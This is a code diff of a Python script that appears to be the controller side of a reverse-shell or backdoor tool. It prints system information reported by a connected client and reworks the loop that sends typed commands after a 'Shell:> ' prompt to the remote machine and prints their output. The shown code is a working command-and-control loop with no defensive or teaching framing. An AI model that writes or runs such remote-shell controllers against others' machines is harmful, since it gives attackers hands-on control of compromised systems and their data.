@@ -21,8 +21,8 @@ def connection():
 
     print("\n ==================== SYSTEM INFO ====================  \n")
     sys_info(conn)
-    
-    send_command(conn)
+
+    send_commands(conn)
     conn.close()
 
 def sys_info(conn):
@@ -33,21 +33,18 @@ def sys_info(conn):
         print(key + ": " + val )
 
 # Sending commands
-def send_command(conn):
+def send_commands(conn):
     while True:
-        cmd = input()
-        if cmd == 'exit':
-            conn.close()
-            server.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(2048), "utf-8")
-            print(client_response, end="")
-            
-# def input_command():
-#     input("Input command: ")
-#     return input()
+        command = input("Shell:> ")
+        conn.send(command.encode())
+        if command.lower() == 'exit':
+            break
+
+        results = conn.recv(20480).decode()
+        print(results)
+
+    conn.close()
+    server.close()
 
 
 def main():
